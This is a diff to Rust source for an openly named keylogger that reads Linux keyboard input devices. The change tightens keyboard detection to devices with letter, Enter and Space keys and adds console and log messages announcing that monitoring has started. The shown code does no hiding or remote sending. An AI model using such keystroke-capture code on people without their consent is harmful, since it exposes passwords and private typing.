@@ -21,25 +21,36 @@ pub fn run_keylogger(log_path: &str) {
     
     for (path, device) in devices {
         // Check if device has keyboard capabilities
-        if let Some(_keys) = device.supported_keys() {
-            // Device has keys, likely a keyboard
-            let name = device.name().unwrap_or("Unknown");
-            let phys = device.physical_path().unwrap_or("Unknown");
+        // A real keyboard should support letter keys like KEY_A
+        if let Some(keys) = device.supported_keys() {
+            // Check if device supports basic letter keys (indicates it's a real keyboard)
+            // We check for multiple letter keys across the keyboard to ensure it's a typing
+            // keyboard, not just a device with a few control keys (like mice or audio controls)
+            let has_letter_keys = keys.contains(Key::KEY_A) 
+                && keys.contains(Key::KEY_Z)
+                && keys.contains(Key::KEY_M)  // Middle of alphabet
+                && keys.contains(Key::KEY_ENTER)
+                && keys.contains(Key::KEY_SPACE);
             
-            println!("Found keyboard device:");
-            println!("  Name: {}", name);
-            println!("  Path: {:?}", path);
-            println!("  Physical: {}", phys);
-            
-            // Check if it's a USB device
-            if phys.contains("usb") {
-                println!("  Type: USB Keyboard");
-            } else {
-                println!("  Type: Internal/Other");
+            if has_letter_keys {
+                let name = device.name().unwrap_or("Unknown");
+                let phys = device.physical_path().unwrap_or("Unknown");
+                
+                println!("Found keyboard device:");
+                println!("  Name: {}", name);
+                println!("  Path: {:?}", path);
+                println!("  Physical: {}", phys);
+                
+                // Check if it's a USB device
+                if phys.contains("usb") {
+                    println!("  Type: USB Keyboard");
+                } else {
+                    println!("  Type: Internal/Other");
+                }
+                println!();
+                
+                keyboards.push((path, name.to_string()));
             }
-            println!();
-            
-            keyboards.push((path, name.to_string()));
         }
     }
 
@@ -77,6 +88,15 @@ pub fn run_keylogger(log_path: &str) {
         eprintln!("Make sure you run this with sudo or have proper permissions.");
         std::process::exit(1);
     }
+
+    println!("Keylogger is now active and monitoring keyboards.");
+    println!("Keys will be logged to: {}", log_path);
+    println!("Keys will also be printed to this console.");
+    println!("Press Ctrl+C to stop.\n");
+    
+    writeln!(file, "=== Monitoring started, waiting for key events ===")
+        .expect("Failed to write to log file");
+    file.flush().expect("Failed to flush log file");
 
     // Main event loop
     loop {
